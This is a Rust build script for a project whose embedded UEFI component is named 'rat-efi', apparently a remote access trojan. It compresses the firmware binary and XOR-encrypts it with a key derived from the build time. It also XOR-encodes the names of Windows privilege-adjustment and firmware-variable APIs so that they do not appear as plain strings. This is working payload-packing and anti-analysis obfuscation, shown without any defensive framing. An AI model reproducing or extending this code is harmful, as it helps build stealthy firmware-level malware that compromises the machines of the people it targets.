use std::ffi::CStr;
use std::io::Write;
use std::path::PathBuf;
use std::time::{SystemTime, UNIX_EPOCH};
use std::{env, fs};

use sha2::{Digest, Sha512};

#[cfg(debug_assertions)]
const EFI_APPLICATION: &[u8] =
    include_bytes!("../rat-efi/target/x86_64-unknown-uefi/debug/rat-efi.efi");

#[cfg(not(debug_assertions))]
const EFI_APPLICATION: &[u8] =
    include_bytes!("../rat-efi/target/x86_64-unknown-uefi/release/rat-efi.efi");

const SYMBOL_TABLE: &[&CStr] = &[
    c"advapi32.dll",
    c"OpenProcessToken",
    c"LookupPrivilegeValueW",
    c"AdjustTokenPrivileges",
    c"kernel32.dll",
    c"GetFirmwareEnvironmentVariableW",
];

fn main() {
    let env_out_dir = PathBuf::from(env::var("OUT_DIR").unwrap());
    let embedded_file = env_out_dir.join("embedded.efi");

    let mut compressed = vec![];
    let mut compressor = zstd::Encoder::new(&mut compressed, 22).unwrap();
    compressor.write_all(EFI_APPLICATION).unwrap();
    compressor.finish().unwrap();

    let key = Sha512::digest(
        SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_nanos()
            .to_le_bytes(),
    )
    .to_vec();

    let mut encrypted = Vec::with_capacity(compressed.len());
    for (i, m) in compressed.iter().enumerate() {
        encrypted.push(m ^ key[i % key.len()]);
    }

    let mut file = fs::File::create(&embedded_file).unwrap();
    file.write_all(&encrypted).unwrap();

    let key_file = env_out_dir.join("key.rs");
    let mut file = fs::File::create(&key_file).unwrap();
    file.write_all(
        format!(
            "pub const EFI_APPLICATION_KEY: &[u8; {}] = &{key:?};\n",
            key.len(),
        )
        .as_bytes(),
    )
    .unwrap();

    for symbol in SYMBOL_TABLE {
        let mut buffer = symbol.to_bytes_with_nul().to_vec();
        for (i, e) in buffer.iter_mut().enumerate() {
            *e ^= key[i % key.len()];
        }

        let variable_name = symbol.to_str().unwrap().replace(".", "_");
        file.write_all(b"#[allow(non_upper_case_globals)]\n")
            .unwrap();
        file.write_all(format!("pub const {variable_name}: &[u8] = &{buffer:?};\n").as_bytes())
            .unwrap();
    }
}
